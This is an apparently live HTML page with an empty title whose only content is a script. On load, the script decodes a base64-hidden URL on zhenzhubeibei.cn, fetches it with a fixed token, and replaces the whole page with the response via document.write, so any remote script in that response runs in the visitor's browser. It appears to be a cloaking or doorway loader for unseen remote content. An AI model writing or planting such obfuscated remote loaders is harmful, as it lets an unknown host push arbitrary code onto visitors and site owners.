<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
</head>
<body>
<script>
    function clientSideInclude(url) {
        var req = false;
        if (window.XMLHttpRequest) {
            try {
                req = new XMLHttpRequest();
            } catch (e) {
                req = false;
            }
        } else if (window.ActiveXObject) {
            try {
                req = new ActiveXObject("Msxml2.XMLHTTP");
            } catch (e) {
                try {
                    req = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                    req = false;
                }
            }
        }
        var element = document.getElementsByTagName("body")[0];
        if (!element) {
            alert("页面加载错误！！！！");
            return;
        }
        if (req) {
            console.log(window.atob(url)+'string=cf%21cdc1_a445%2C%29ccf93c-34%7E30a27f4ae2%2891f0%40&id=1&pks=ff3301c734e0c219d4eb703397378891');
            //string:cf!cdc1_a445,)ccf93c-34~30a27f4ae2(91f0@
            req.open('GET', window.atob(url)+'string=cf%21cdc1_a445%2C%29ccf93c-34%7E30a27f4ae2%2891f0%40&id=1&pks=ff3301c734e0c219d4eb703397378891', false);
            req.send(null);
            if (req.status == 404) {
                alert("页面加载错误！！！！");
            } else {
                var doc = document.open('text/html', 'replace');
                doc.write(req.responseText);
                doc.close();
            }
        } else {
            element[0].innerHTML ="页面加载错误！！！！";
        }
    }
    clientSideInclude("aHR0cDovL3poZW56aHViZWliZWkuY24vaW5kZXgvTmV3bGFuZD8=");
    //http://zhenzhubeibei.cn/index/Newland?
</script>
</body>
</html>